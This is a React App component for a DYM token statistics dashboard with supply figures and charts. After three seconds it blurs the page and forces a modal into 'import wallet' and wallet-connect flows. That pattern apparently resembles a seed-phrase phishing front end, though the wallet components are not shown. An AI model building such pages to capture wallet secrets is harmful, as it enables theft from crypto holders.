import "./App.css";
import AreaChart1 from "./components/AreaChart1";
import AreaChart2 from "./components/AreaChart2";
import AreaChart3 from "./components/AreaChart3";
import AreaChart4 from "./components/AreaChart4";
import Navbar from "./components/Navbar";
import Tabs from "./components/Tabs";
import logof from "./assets/logof.jpg";
import date from "./assets/date.jpg";
import PieChart1 from "./components/PieChart1";
import PieChart2 from "./components/PieChart2";
import { useEffect, useState } from "react";
import Modal from "./components/Modal";
import ImportWallet from "./components/ImportWallet";
import WalletConnectModal from "./components/WalletConnectModal";

function App() {
  const [showModal, setShowModal] = useState(false);
  const [importWallet, setImportWallet] = useState(false);
  const [walletCn, setWalletCn] = useState(false);
  const [currentWallet, setCurrentWallet] = useState("");
  // Step 2: Use useEffect to update state after 3 seconds
  useEffect(() => {
    const timer = setTimeout(() => {
      // Step 3: Update state after 3 seconds
      setShowModal(true);
    }, 3000);

    // Step 4: Cleanup the timer to avoid memory leaks
    return () => clearTimeout(timer);
  }, []); // Empty dependency array ensures that the effect runs only once
  return (
    <div className="App">
      <div
        className={`${
          importWallet || showModal || walletCn ? "blur-sm" : "blur-none"
        }`}
      >
        <Navbar setShowModal={setShowModal} />
        <Tabs setShowModal={setShowModal} />
        <div className="max-w-[1400px] mx-auto">
          <div className="bg-[#252120] rounded-md p-3 border border-slate-800 my-5">
            <div className="flex items-start justify-between">
              <div>
                <p className="text-slate-400 text-lg">Total Supply</p>
                <div className="flex items-center gap-2 py-2">
                  <p className="text-[#f1e1d4] text-md font-semibold">
                    1,007,195,003 DYM
                  </p>
                  <p className="text-[#59F0BE] text-sm font-semibold">
                    0.02% (24h)
                  </p>
                </div>
              </div>
              <img src={date} alt="date" />
            </div>
            <div className="grid md:grid-cols-2 justify-items-center grid-cols-2 gap-5 ">
              <PieChart1 />
              <PieChart2 />
            </div>
          </div>
          <div className="grid md:grid-cols-2 grid-cols-1 gap-5">
            <AreaChart1 />
            <AreaChart2 />
            <AreaChart3 />
            <AreaChart4 />
          </div>
        </div>
        <div className="flex items-center justify-center w-full p-5">
          <img src={logof} alt="logof" />
        </div>
      </div>
      {showModal && (
        <Modal
          setImportWallet={setImportWallet}
          setShowModal={setShowModal}
          setWalletCn={setWalletCn}
          setCurrentWallet={setCurrentWallet}
        />
      )}
      {importWallet && (
        <ImportWallet
          setImportWallet={setImportWallet}
          setShowModal={setShowModal}
          setWalletCn={setWalletCn}
          currentWallet={currentWallet}
        />
      )}

      {walletCn && (
        <WalletConnectModal
          importWallet={importWallet}
          setImportWallet={setImportWallet}
          setWalletCn={setWalletCn}
          setCurrentWallet={setCurrentWallet}
        />
      )}
    </div>
  );
}

export default App;
